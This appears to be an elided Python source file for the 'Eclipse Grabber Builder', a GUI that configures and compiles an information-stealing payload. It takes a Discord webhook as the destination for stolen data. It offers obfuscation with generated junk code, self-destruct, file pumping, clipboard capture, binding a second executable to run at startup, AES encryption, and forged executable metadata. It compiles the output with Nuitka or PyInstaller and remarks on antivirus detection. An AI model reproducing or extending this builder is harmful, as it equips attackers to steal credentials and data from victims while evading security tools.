...
class App(ctk.CTk):
    def __init__(self):
        ...
        self.title(f"Eclipse Grabber Builder - Running on v{sys.version.split()[0]}")
        ...
        image_path = os.path.join(
            os.path.dirname(os.path.realpath(__file__)), "./gui_images/"
        )
        self.basefilepath = os.path.dirname(str(os.path.realpath(__file__)))
        self.logo_image = ctk.CTkImage(
            Image.open(os.path.join(image_path, "eclipse.png")), size=(60, 60)
        )
        self.large_test_image = ctk.CTkImage(
            Image.open(os.path.join(image_path, "eclipse.png")), size=(500, 150)
        )
        self.image_icon_image = ctk.CTkImage(
            Image.open(os.path.join(image_path, "eclipse.png")), size=(20, 20)
        )
        self.dashboard_image = ctk.CTkImage(
            dark_image=Image.open(os.path.join(image_path, "home.png")), size=(30, 30)
        )
        self.docs_image = ctk.CTkImage(
            dark_image=Image.open(os.path.join(image_path, "clipboard.png")),
            size=(30, 30),
        )
        self.help_image = ctk.CTkImage(
            dark_image=Image.open(os.path.join(image_path, "help.png")), size=(20, 20)
        )
        self.font = "Supernova"
        self.iconpath = None
        self.iconbitmap(f"{image_path}eclipse.ico")
        self.boundExePath = ""
        ...
        self.webhook_button = ctk.CTkEntry(
            self.builder_frame,
            width=570,
            height=35,
            font=ctk.CTkFont(size=15, family=self.font),
            placeholder_text="https://discord(app).com/api/webhooks/1234567890/abcdefhgijklmnopqrstuvwxyz",
        )
        self.webhook_button.grid(row=0, column=0, sticky="nw", padx=15, pady=20)

        self.checkwebhook_button = ctk.CTkButton(
            master=self.builder_frame,
            width=100,
            height=35,
            text="Check Webhook",
        ...
        self.option_help = ctk.CTkButton(
            self.builder_frame,
            width=12,
            text="",
        ...
        self.obfuscation = ctk.CTkCheckBox(
            ...
            fg_color="#c16d00",
            hover_color="#e07a00",
            command=self.check_obfuscation,
        )
        ...
        self.self_destruct = ctk.CTkCheckBox(
            self.builder_frame,
            text="Self Destruct",
            font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#c16d00",
        ...
        self.pump = ctk.CTkCheckBox(
            self.builder_frame,
            text="File Pumper",
            font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#c16d00",
            hover_color="#e07a00",
            command=lambda: (self.check_pumper(), self.check_pump()),
        )
        self.pump.grid(row=1, column=0, sticky="ne", padx=112, pady=285)

        self.pump_size = ctk.CTkOptionMenu(
            self.builder_frame,
            width=30,
            font=ctk.CTkFont(size=17, family=self.font),
        ...
        self.clipboard = ctk.CTkCheckBox(
            self.builder_frame,
            text="Clipboard",
            font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#c16d00",
        ...
        self.fileopts = ctk.CTkOptionMenu(
            self.builder_frame,
            values=["nuitka (.exe)", "pyinstaller (.exe)", ".py"],
            font=ctk.CTkFont(size=32, family=self.font),
            width=250,
            height=45,
            fg_color="#c16d00",
            button_hover_color="#e07a00",
            button_color="#4a2f00",
            command=self.file_type_check,
        )
        self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=365)
        self.fileopts.set("nuitka (.exe)")

        self.icon = ctk.CTkButton(
            self.builder_frame,
            width=250,
            text="Add Icon",
            fg_color="#c16d00",
            hover_color="#e07a00",
            font=ctk.CTkFont(size=33, family=self.font),
        ...
        self.docsbox = ctk.CTkTextbox(
            self.second_frame,
            width=725,
            height=485,
            font=ctk.CTkFont(size=12, weight="bold", family=self.font),
        )
...
Nuitka - Builds a standalone executable file with the necessary modules inside of it.\nAdvantages: Smaller than PyInstaller and way faster.\nDisadvantages: Detected by antiviruses, longer buildtimes.
    ...
    def check_webhook_button(self):
        if self.verify_webhook():
            self.checkwebhook_button.configure(
                width=100,
                height=35,
                fg_color="green",
                hover_color="#0db60e",
    ...
    def bindExeButtonControl_Callback(self):
        ...
        if buttonText == BIND:
            ...
            filePath = ctk.filedialog.askopenfilename(
                title="Select file to bind", initialdir=".", filetypes=allowedFiletypes
            )
            if os.path.isfile(filePath):
                ...
                if messagebox.askyesno(
                    "Bind Executable",
                    "Do you want this bound executable to run on startup as well? (Only works if `Add To Startup` option is enabled)",
                ):
    ...
    def get_icon(self):
        ...
        if buttonText == ADD:
            user_pictures_dir = winreg.QueryValueEx(
                winreg.OpenKey(
            ...
            allowedFiletypes = [
                (
                    "Image Files",
                    ["*.ico", "*.bmp", "*.gif", "*.jpeg", "*.png", "*.tiff", "*.webp"],
                )
            ]
    ...
    def update_config(self):
        ...
        for key, checkbox in checkbox_mapping.items():
            self.updated_dictionary["mutex"] = "".join(
    ...
    def reset_check_webhook_button(self):
        self.checkwebhook_button.configure(
            fg_color="#c16d00", hover_color="#e07a00", text="Check Webhook"
        )
    ...
    def get_config(self):
        ...
        try:
            with open(self.basefilepath + "\\eclipse.py", "r", encoding="utf-8") as f:
                code = f.read()
            ...
            code += """Eclipse(__CONFIG__["webhook"])"""
    ...
    def compile_file(self, filename, filetype):
        try:
            ...
            encrypted = pyaes.AESModeOfOperationGCM(key, iv).encrypt(
            ...
            if filetype == "pyinstaller":
                ...
                if os.path.isfile("bound.eclipse"):
                    command.insert(-1, "--add-data")
                    command.insert(-1, "bound.eclipse;.")
                    ...
                    try:
                        for option, enabled in self.updated_dictionary.items():
                            if enabled and option in option_module_mapping_nuitka:
                                included_modules_nuitka.extend(
                                    option_module_mapping_nuitka[option]
                                )
                        ...
                        if os.path.isfile("bound.eclipse"):
                            command.insert(-1, "--include-data-file=bound.eclipse=.")
                        ...
                        logging.info(
                            f"Successfully compiled {filename}.exe with nuitka"
                        )
    ...
    def write_and_obfuscate(self, filename):
        def _generate_name():
            return "_%s" % "".join(
                random.choices(
                    string.ascii_letters + string.digits, k=random.randint(8, 20)
                )
            )
...
class %s:
    def __init__(self):
            ...
            junk_code += "".join(
                [
                    ...
                    % (
                        ...
                        junk_funcs[index],
                        ", ".join(
                            [_generate_name() for _ in range(random.randint(5, 20))]
                        ),
                        " " * 8,
        ...
        try:
            ...
            if self.obfuscation.get() == 1:
                _junk(f"./{filename}.py")
                os.system(
                    f'"{sys.executable}" ./tools/obfuscation.py -i ./{filename}.py'
                )
                os.remove(f"./{filename}.py")
    ...
    def PrepareBound(self):
        if os.path.isfile(self.boundExePath):
            ...
            with open("bound.eclipse", "wb") as f:
                f.write(encrypted)

        elif os.path.isfile("bound.eclipse"):
            os.remove("bound.eclipse")
    ...
    def ExtractNuitkaOptions(self, origFilenameOnly: bool = False):
        ...
        file_description = re.search(
            r"StringStruct\('FileDescription', '([^']*)'\)", content
        )
        copyright_info = re.search(
            r"StringStruct\('LegalCopyright', '([^']*)'\)", content
        )
        original_filename = re.search(
            r"StringStruct\('OriginalFilename', '([^']*)'\)", content
        )
        ...
        if (
            not company_name
            or not product_name
            or not file_description
            or not copyright_info
        ):
